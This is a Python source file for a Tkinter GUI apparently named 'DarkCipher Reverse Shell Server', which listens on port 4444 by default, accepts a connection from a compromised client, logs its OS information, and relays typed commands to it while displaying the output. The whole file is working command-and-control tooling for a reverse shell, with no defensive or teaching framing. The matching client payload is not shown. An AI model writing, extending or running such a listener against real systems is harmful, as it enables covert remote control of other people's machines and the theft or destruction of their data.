import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox, simpledialog

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

class ReverseShellGUI:
    def __init__(self, master):
        self.master = master
        master.title("DarkCipher Reverse Shell Server")
        master.geometry("700x500")
        master.resizable(False, False)

        self.text_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, font=("Courier", 10))
        self.text_area.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)

        self.command_entry = tk.Entry(master, font=("Courier", 10))
        self.command_entry.pack(fill=tk.X, padx=10, pady=5)
        self.command_entry.bind("<Return>", self.send_command)

        self.start_button = tk.Button(master, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=5)

        self.server = None
        self.client_socket = None
        self.is_connected = False

    def log(self, msg):
        self.text_area.insert(tk.END, msg + "\n")
        self.text_area.see(tk.END)

    def start_server(self):
        host = simpledialog.askstring("Input", "Enter IP to listen on:", initialvalue=get_local_ip())
        port = simpledialog.askinteger("Input", "Enter port to listen on:", initialvalue=4444)

        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((host, port))
            self.server.listen(1)
            self.log(f"[+] Listening on {host}:{port}...")
            threading.Thread(target=self.accept_connection, daemon=True).start()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {e}")

    def accept_connection(self):
        self.client_socket, client_address = self.server.accept()
        self.is_connected = True
        self.log(f"[+] Connection from {client_address}")

        os_info = self.client_socket.recv(1024).decode(errors='ignore')
        self.log(f"[+] Client OS info: {os_info}")

        # Start listening for responses from client
        threading.Thread(target=self.receive_response, daemon=True).start()

    def send_command(self, event=None):
        if not self.is_connected:
            self.log("[!] No client connected.")
            return

        cmd = self.command_entry.get().strip()
        if cmd.lower() == "exit":
            self.client_socket.close()
            self.server.close()
            self.master.destroy()
            return

        if cmd:
            try:
                self.client_socket.send(cmd.encode())
                self.log(f"[>] Sent: {cmd}")
            except Exception as e:
                self.log(f"[!] Failed to send command: {e}")
        self.command_entry.delete(0, tk.END)

    def receive_response(self):
        while True:
            try:
                response = self.client_socket.recv(4096).decode(errors='ignore')
                if response:
                    self.log(response)
                else:
                    self.log("[!] Connection lost.")
                    break
            except Exception as e:
                self.log(f"[!] Error receiving data: {e}")
                break

if __name__ == "__main__":
    root = tk.Tk()
    app = ReverseShellGUI(root)
    root.mainloop()
